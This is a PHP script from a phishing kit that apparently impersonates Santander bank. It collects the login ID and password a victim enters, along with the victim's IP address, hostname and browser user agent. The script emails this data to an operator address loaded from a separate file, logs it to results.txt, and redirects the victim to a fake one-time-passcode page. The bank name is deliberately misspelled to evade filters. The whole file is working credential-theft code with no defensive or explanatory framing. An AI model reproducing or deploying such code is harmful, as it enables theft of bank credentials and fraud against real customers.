<?php
if($_POST["u"] != "" and $_POST["p"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------San.tan'der Info-----------------------\n";
$message .= "ID			            	: ".$_POST['u']."\n";
$message .= "Secur!ty #`	           	: ".$_POST['p']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
//------ append result
$handle = fopen('results.txt', 'a');
fwrite($handle, $message."\n");
fclose($handle);
//---- end append result
    
}
$praga=rand();
$praga=md5($praga);
  header ("Location: otp.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>